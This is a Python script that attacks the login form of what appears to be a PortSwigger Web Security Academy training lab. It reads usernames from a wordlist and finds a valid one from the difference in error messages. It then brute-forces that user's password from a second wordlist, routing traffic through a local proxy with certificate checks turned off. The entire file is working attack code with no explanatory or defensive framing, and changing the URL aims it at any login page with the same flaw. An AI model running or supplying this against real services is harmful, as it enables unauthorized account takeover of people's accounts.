import requests 
import urllib3

url = "https://0ad9000a0387683780e6a89d00d30037.web-security-academy.net/login"
# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


with open("username.txt",'r') as file:
    for i in file:
        username_payload = i.strip()
        data = {"username":username_payload,"password":"password_payload"}
        response= requests.post(url,verify=False,proxies=proxies,data=data)
        #print(response)
        if 'Invalid username or password.' not in response.text:
           print("username found",username_payload)
           a =  username_payload
           break

with open("password.txt",'r') as f:
    for j in f:
        password_payload=j.strip()
        data = {"username":username_payload,"password":password_payload}
        response11= requests.post(url,verify=False,proxies=proxies,data=data)
        if "Your username is" in response11.text:
            print("password found ",password_payload)
            break
            
    

#data = {"username":username,"password":password}

